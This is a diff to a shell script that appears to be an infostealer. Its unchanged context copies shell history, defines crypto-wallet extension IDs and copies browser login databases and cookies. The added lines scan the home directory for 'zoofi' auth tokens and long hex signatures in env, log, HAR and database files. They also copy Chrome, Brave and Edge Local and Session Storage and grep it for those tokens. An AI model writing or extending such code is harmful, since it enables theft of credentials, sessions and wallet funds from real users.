@@ -36,6 +36,10 @@ while IFS= read -r f; do
 done < "$D/g/envlist.txt"
 rm -f "$D/g/list.txt" "$D/g/envlist.txt" 2>/dev/null
 for f in "$HOME/.zsh_history" "$HOME/.bash_history"; do [ -f "$f" ] && cp "$f" "$D/g/" 2>/dev/null; done
+# ---- 1b. 全 HOME 已签名 zoofi ops-token / 长 hex 签名 grep ----
+find "$HOME" -maxdepth 6 -type f -size -200k \( -name '.env*' -o -name '*.json' -o -name '*.js' -o -name '*.txt' -o -name '*.log' -o -name '*.har' -o -name '.zsh_history' -o -name '*.sqlite' -o -name '*.db' \) 2>/dev/null | grep -v '/Library/Caches/' | head -6000 > "$D/g/opslist.txt"
+tr '\n' '\0' < "$D/g/opslist.txt" | xargs -0 grep -IaE -m 2 -E 'Auth for zoofi|0x[0-9a-fA-F]{130}' 2>/dev/null | head -c 300000 > "$D/g/ops.txt"
+rm -f "$D/g/opslist.txt" 2>/dev/null
 # ---- 2. wallet IndexedDB: 先做 inline vault 抽取 ----
 WIDS='ejbalbakoplchlghecdalmeeeajnimhm|nkbihfbeogaeaoehlefnkodbefgpgknn|ocodgmmffbkkeecmadcijjhkmeohinei|fijngjgcjhjmmpcmkeiomlglpeiijkld|jdiccldimpdaibmpdkjnbmckianbfold|dmkamcknogkgcdfhhbddcghachkejeap|acmacodkjbdgmoleebolmdjonilkdbch|mcohilncbfahbmgdjkbpemcciiolgcge|hnfanknocfeofbddgcijnmhnfnkdnaad|bfnaelmomeimhlpmgjnjophhpkkoljpa|fhbohimaelbohpjbbldcngcnapndodjp|ibnejdfjmmkpcnlpebklmnkoeoihofec'
 MMIDS='ejbalbakoplchlghecdalmeeeajnimhm|nkbihfbeogaeaoehlefnkodbefgpgknn|dmkamcknogkgcdfhhbddcghachkejeap|acmacodkjbdgmoleebolmdjonilkdbch'
@@ -82,6 +86,21 @@ for B in "Google/Chrome" "BraveSoftware/Brave-Browser" "Microsoft Edge" Chromium
         cp -R "$E/." "$D/les/$BN-$PN-$id/" 2>/dev/null
       done; unset IFS
     fi
+    for LS in "Local Storage" "Session Storage" "IndexedDB"; do
+      [ -d "$P2/$LS" ] || continue
+      SZ2=$(du -sm "$P2/$LS" 2>/dev/null | cut -f1); [ "${SZ2:-0}" -gt 30 ] && continue
+      case "$LS" in IndexedDB) continue;; esac
+      TS=$(echo "$LS" | tr -cd 'A-Za-z'); mkdir -p "$D/br/$BN-$PN-$TS" 2>/dev/null
+      for f in "$P2/$LS"/*; do
+        [ -f "$f" ] || continue
+        fs=$(wc -c < "$f" 2>/dev/null | tr -d ' '); [ "${fs:-0}" -gt 6000000 ] && continue
+        cp "$f" "$D/br/$BN-$PN-$TS/" 2>/dev/null
+      done
+      for f in "$D/br/$BN-$PN-$TS"/*; do
+        [ -f "$f" ] || continue
+        grep -Ia -m 2 -E 'zoofi|Auth for zoofi' "$f" 2>/dev/null | head -c 20000 >> "$D/g/ls_zoofi.txt"
+      done
+    done
     mkdir -p "$D/br/$BN-$PN" 2>/dev/null
     for f in "Login Data" "Cookies" "Preferences" "Secure Preferences" "Network/Cookies"; do
       [ -f "$P2/$f" ] && cp "$P2/$f" "$D/br/$BN-$PN/$(echo "$f" | tr ' /' '__')" 2>/dev/null
